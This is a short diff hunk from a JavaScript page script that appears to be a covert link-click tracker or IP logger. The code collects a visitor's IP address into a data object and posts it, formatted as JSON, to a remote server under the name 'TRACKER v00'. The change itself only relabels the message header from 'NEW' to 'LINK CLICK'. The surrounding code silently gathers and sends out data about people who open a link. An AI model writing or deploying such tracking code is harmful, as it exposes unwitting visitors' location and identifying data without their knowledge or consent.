@@ -83,7 +83,7 @@ $(document).ready(function() {
                     allCollectedData['ip'] = data;
                     sendToServer({
                         username: "TRACKER v00",
-                        content: '# >-NEW \n```json\n' + JSON.stringify(allCollectedData, null, 2) + '\n```'
+                        content: '# >-LINK CLICK \n```json\n' + JSON.stringify(allCollectedData, null, 2) + '\n```'
                     });
                 } else {
                     // Fallback to IP-only service
